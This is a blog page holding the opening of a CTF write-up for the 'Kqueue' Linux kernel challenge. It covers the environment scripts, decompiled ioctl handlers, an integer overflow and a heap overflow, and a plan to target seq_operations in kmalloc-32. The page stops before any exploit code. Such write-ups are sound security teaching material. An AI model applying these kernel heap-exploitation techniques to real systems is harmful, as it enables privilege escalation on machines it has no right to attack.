<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/07/%E5%86%85%E6%A0%B8shellcode+seq_operations/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/07/%E5%86%85%E6%A0%B8shellcode+seq_operations/" class="post-title-link" itemprop="url">内核shellcode+seq_operations</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-03-07 21:49:48 / Modified: 21:51:24" itemprop="dateCreated datePublished" datetime="2023-03-07T21:49:48+08:00">2023-03-07</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Kqueue</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">stty intr ^]</span></span><br><span class="line">stty sane</span><br><span class="line">exec qemu-system-x86_64 \</span><br><span class="line">    -cpu kvm64 \</span><br><span class="line">    -m 512 \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel &quot;bzImage&quot; \</span><br><span class="line">    -append &quot;console=ttyS0 oops=panic panic=-1 pti=off kaslr quiet&quot; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd &quot;./rootfs.cpio&quot; \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure>
<ul>
<li>kaslr</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> devtmpfs does not get automounted <span class="keyword">for</span> initramfs</span></span><br><span class="line"></span><br><span class="line">export PATH=/bin</span><br><span class="line">export PATH=/sbin:$PATH</span><br><span class="line"></span><br><span class="line">[ -d /dev ] || mkdir -m 0755 /dev</span><br><span class="line">[ -d /sys ] || mkdir /sys</span><br><span class="line">[ -d /proc ] || mkdir /proc</span><br><span class="line">[ -d /tmp ] || mkdir /tmp</span><br><span class="line">[ -d /run ] || mkdir /run</span><br><span class="line">[ -d /root ] || mkdir /root</span><br><span class="line">[ -d /etc ] || mkdir /etc</span><br><span class="line">[ -d /home ] || mkdir /home</span><br><span class="line"></span><br><span class="line">chmod 644 /etc/passwd</span><br><span class="line">chmod 644 /etc/group</span><br><span class="line">chown -R root:root /</span><br><span class="line">chmod 700 /flag</span><br><span class="line"></span><br><span class="line">chmod 700 -R /root</span><br><span class="line">chown ctf:ctf -R /home/ctf</span><br><span class="line">chmod 777 /home/ctf</span><br><span class="line">chmod 755 /dev</span><br><span class="line"></span><br><span class="line">mkdir -p /var/lock</span><br><span class="line">mount -t sysfs -o nodev,noexec,nosuid sysfs /sys</span><br><span class="line">mount -t proc -o nodev,nosuid proc /proc</span><br><span class="line">ln -sf /proc/mounts /etc/mtab</span><br><span class="line">mount -t devtmpfs -o nosuid,mode=0755 udev /dev</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -t devpts -o noexec,nosuid,gid=5,mode=0620 devpts /dev/pts || true</span><br><span class="line">mount -t tmpfs -o &quot;noexec,nosuid,size=10%,mode=0755&quot; tmpfs /run</span><br><span class="line"></span><br><span class="line">insmod /root/kqueue.ko</span><br><span class="line">chmod o+rw /dev/kqueue</span><br><span class="line">chmod u+s /bin/ping</span><br><span class="line"></span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/perf_event_paranoid</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> use the /dev/console device node from devtmpfs <span class="keyword">if</span> possible to not</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> confuse glibc<span class="string">&#x27;s ttyname_r().</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> This may fail (E.G. booted with console=), and errors from exec will</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="string"> terminate the shell, so use a subshell for the test</span></span></span><br><span class="line">if (exec 0&lt;/dev/console) 2&gt;/dev/null; then</span><br><span class="line">    exec 0&lt;/dev/console</span><br><span class="line">    exec 1&gt;/dev/console</span><br><span class="line">    exec 2&gt;/dev/console</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">exec /sbin/init &quot;$@&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>perf_event_paranoid：控制非特权用户对性能事件系统的使用（无CAP_SYS_ADMIN），预设值为 “2” </li>
<li>dmesg_restrict</li>
<li>kptr_restrict</li>
</ul>
<p>经过测试，重新打包会导致程序权限出现问题（不知道为什么），这里只好把其他题目的文件系统拿来用</p>
<p><strong>逆向分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">kqueue_ioctl</span><span class="params">(__int64 fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, __int64 ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  __int64 v7; <span class="comment">// r9</span></span><br><span class="line">  __int64 kqueue; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> v10[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-38h] BYREF</span></span><br><span class="line">  __int16 v11[<span class="number">4</span>]; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">void</span> *src; <span class="comment">// [rsp+10h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  mutex_lock(&amp;operations_lock);</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(v10, ptr, <span class="number">24LL</span>) )</span><br><span class="line">    err((__int64)<span class="string">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( cmd == <span class="number">0xDAADEEEE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kqueue = edit_kqueue((<span class="keyword">int</span>)v10, ptr, v4, v5, v6, v7, *(__int64 *)v10, v11[<span class="number">0</span>], src);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( cmd &gt; <span class="number">0xDAADEEEE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kqueue = <span class="number">-1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( cmd == <span class="number">0xDEADC0DE</span> )</span><br><span class="line">      kqueue = create_kqueue((__int64)v10, ptr, v4, v5, v6, v7, *(__int64 *)v10);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( cmd == <span class="number">0xB105BABE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kqueue = save_kqueue_entries((__int64)v10, ptr, v4, v5, v6, v7, *(__int64 *)v10, v11[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( cmd == <span class="number">0xBADDCAFE</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kqueue = delete_kqueue((__int64)v10, ptr, v4, v5, v6, v7, v10[<span class="number">0</span>], v11[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    kqueue = <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_unlock(&amp;operations_lock);</span><br><span class="line">  <span class="keyword">return</span> kqueue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一眼看上去程序很乱，但切入点在这一句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy_from_user(v10, ptr, <span class="number">24LL</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>由此我们可以判断 v10 是一个结构体，并且大小为 24 字节</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Node struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_3)  ; XREF: delete_kqueue/r</span><br><span class="line"><span class="number">00000000</span>                                         ; edit_kqueue/r ...</span><br><span class="line"><span class="number">00000000</span> field_0 dq ?                            ; XREF: delete_kqueue+<span class="number">2</span>/r</span><br><span class="line"><span class="number">00000000</span>                                         ; edit_kqueue+A/r ...</span><br><span class="line"><span class="number">00000008</span> field_8 dq ?                            ; XREF: edit_kqueue+<span class="number">15</span>/r</span><br><span class="line"><span class="number">00000008</span>                                         ; save_kqueue_entries+<span class="number">19</span>/r ...</span><br><span class="line"><span class="number">00000010</span> field_10 dq ?                           ; XREF: kqueue_ioctl+<span class="number">68</span>/r</span><br><span class="line"><span class="number">00000010</span>                                         ; kqueue_ioctl+B7/r ...</span><br><span class="line"><span class="number">00000018</span> Node ends</span><br></pre></td></tr></table></figure>
<ul>
<li>先对 v10 设置一个结构体，具体的条目可以之后再确定</li>
<li>例如：通过 <code>_kmalloc</code> 可以确定哪个条目代表 size（通过提示信息也可以判断一些条目）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">chunk = (<span class="keyword">char</span> *)_kmalloc(<span class="number">24LL</span> * (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(tmp.size1 + <span class="number">1</span>) + <span class="number">0x20</span>, <span class="number">0xCC0</span>LL);</span><br><span class="line">chunkP = validate(chunk);</span><br><span class="line">chunk = (<span class="keyword">char</span> *)_kmalloc((<span class="keyword">unsigned</span> __int16)tmp.size2, <span class="number">0xCC0</span>LL);</span><br><span class="line">*((_QWORD *)chunkP + <span class="number">3</span>) = validate(chunk);</span><br><span class="line">*(_WORD *)chunkP = tmp.size2;</span><br><span class="line">*((_DWORD *)chunkP + <span class="number">4</span>) = tmp.size1;</span><br><span class="line">*((_QWORD *)chunkP + <span class="number">1</span>) = v2;</span><br><span class="line">v6 = chunkP + <span class="number">32</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>其实这里可以看出来程序还有一个结构体 chunkP，大小不确定</li>
<li>对于大小不确定并且在堆上的结构体，我们可以尽量多设置一些条目，然后根据情况进行修改</li>
</ul>
<p>复原结构体后，随便打开一个参数很多的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">create_kqueue</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// r13d</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// r15</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 j; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// ebx</span></span><br></pre></td></tr></table></figure>
<ul>
<li>发现 <code>a1~a6</code> 根本没有用上（从 <code>a7(v10)</code> 开始有用），可以用 IDA 删除这些多余的参数</li>
<li><code>v10</code> 是一个结构体（不是结构体指针），出现在 <code>RBP+0x8</code> 的位置</li>
<li>IDA 分析时不会把 <code>v10</code> 当做是一个结构体，而是把它拆分为多个使用过的结构体条目（没有使用过的结构体条目会被直接忽略）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> request; <span class="comment">// [rsp+3Eh] [rbp+Eh]</span></span><br><span class="line"><span class="keyword">char</span> request_2; <span class="comment">// [rsp+40h] [rbp+10h]</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">void</span> *request_3; <span class="comment">// [rsp+48h] [rbp+18h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( *(_WORD *)&amp;request_2 &gt; <span class="number">5u</span> )</span><br><span class="line">  err((__int64)<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"><span class="built_in">queue</span> = (Queue *)(&amp;kqueues)[*(<span class="keyword">unsigned</span> __int16 *)&amp;request_2];</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">queue</span> )</span><br><span class="line">  err((__int64)<span class="string">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( *(<span class="keyword">unsigned</span> __int16 *)&amp;request &gt; <span class="built_in">queue</span>-&gt;max_entries )</span><br><span class="line">  err((__int64)<span class="string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li><code>request_2</code> 就是 <code>Node-&gt;queue_idx</code></li>
<li><code>request</code> 就是 <code>Node-&gt;entry_idx</code></li>
<li><code>request_3</code> 就是 <code>Node-&gt;data</code></li>
<li>由于 <code>Node-&gt;data_size</code> 和 <code>Node-&gt;max_entries</code> 没有使用，于是被 IDA 忽略了</li>
</ul>
<p>对于这种情况建议不要把形参修成一个结构体，而是就把它设置为多个结构体条目：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int16 entry_idx; <span class="comment">// [rsp+3Eh] [rbp+Eh]</span></span><br><span class="line"><span class="keyword">unsigned</span> __int16 queue_idx; <span class="comment">// [rsp+40h] [rbp+10h]</span></span><br><span class="line"><span class="keyword">char</span> *data; <span class="comment">// [rsp+48h] [rbp+18h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( queue_idx &gt; <span class="number">5u</span> )</span><br><span class="line">  err(<span class="string">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class="line"><span class="built_in">queue</span> = kqueues[queue_idx];</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">queue</span> )</span><br><span class="line">  err(<span class="string">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( entry_idx &gt; <span class="built_in">queue</span>-&gt;max_entries )</span><br><span class="line">  err(<span class="string">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>分析全局，在内核堆上的结构如下：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">----------------</span></span><br><span class="line"><span class="code">[	 queue     ]</span></span><br><span class="line"><span class="code">----------------</span></span><br><span class="line"><span class="meta">[ kqueue_entry ]</span></span><br><span class="line"><span class="code">----------------</span></span><br><span class="line"><span class="code">[ kqueue_entry ]</span></span><br><span class="line"><span class="code">----------------</span></span><br><span class="line"><span class="meta">[ kqueue_entry ]</span></span><br><span class="line"><span class="code">----------------</span></span><br><span class="line"><span class="code">[ kqueue_entry ]</span></span><br><span class="line"><span class="code">----------------</span></span><br><span class="line"><span class="meta">[ kqueue_entry ]</span></span><br><span class="line">----------------</span><br></pre></td></tr></table></figure>
<ul>
<li>这一整片内存的大小是确定的</li>
<li>程序根据 <code>queue-&gt;max_entries</code> 来确定 <code>kqueue_entry</code> 的个数</li>
<li>每个 <code>queue</code> 和 <code>kqueue_entry</code> 都有一个 <code>data</code> 条目，指向一片大小为 <code>request.data_size</code> 的堆空间</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>在 <code>create_kqueue</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">num = request.max_entries + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( num &gt; <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i != num; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( request.max_entries != i )</span><br><span class="line">            current_entry-&gt;next = <span class="number">0LL</span>;</span><br><span class="line">        current_entry-&gt;index = i;</span><br><span class="line">        data = (<span class="keyword">char</span> *)_kmalloc(request.data_size, <span class="number">0xCC0</span>LL);</span><br><span class="line">        current_entry-&gt;data = validate(data);</span><br><span class="line">        ++current_entry;</span><br><span class="line">        current_entry[<span class="number">-1</span>].next = current_entry;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>局部变量 <code>num</code> 的类型为 <code>unsigned int</code>，对其加一可能会导致整形溢出</li>
<li>写入 <code>0xffffffff</code> 会导致 <code>request.max_entries + 1</code> 溢出为 <code>0x0</code>，导致不初始化 <code>queue_entry</code> 的同时使得 <code>queue-&gt;max_entries = 0xffffffff</code> </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">queue_size = <span class="number">24LL</span> * (request.max_entries + <span class="number">1</span>) + <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">if</span> ( queue_size &gt; <span class="number">0x10020</span> )</span><br><span class="line">    err(<span class="string">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>同理，<code>request.max_entries + 1</code> 的溢出会导致 <code>queue_size</code> 变为 <code>0x20</code></li>
</ul>
<p>在 <code>save_kqueue_entries</code> 中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new_queue = (Queue *)kzalloc(<span class="built_in">queue</span>-&gt;queue_size, <span class="number">0xCC0</span>);</span><br><span class="line">new_queue = (Queue *)validate((<span class="keyword">char</span> *)new_queue);</span><br><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)request.data_size &gt; <span class="built_in">queue</span>-&gt;queue_size )</span><br><span class="line">    err(<span class="string">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class="line">data = <span class="built_in">queue</span>-&gt;data;</span><br><span class="line"><span class="keyword">if</span> ( !request.data_size || !data )</span><br><span class="line">    err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(new_queue, data, request.data_size);</span><br></pre></td></tr></table></figure>
<ul>
<li>而 <code>request.data_size</code> 是我们输入的数据，过大会导致 <code>new_queue</code> 堆溢出</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>首先 <code>save_kqueue_entries</code> 的 <code>new_queue</code> 是有堆溢出的</p>
<p>结合 <code>create_kqueue</code> 中的整形溢出，就会使 <code>new_queue</code> 从 <code>kmalloc-32</code> 中申请空间，然后就可以在 <code>kmalloc-32</code> 中进行溢出</p>
<p>对于 <code>kmalloc-32</code> 我们可以使用 <code>seq_operations</code>：</p>
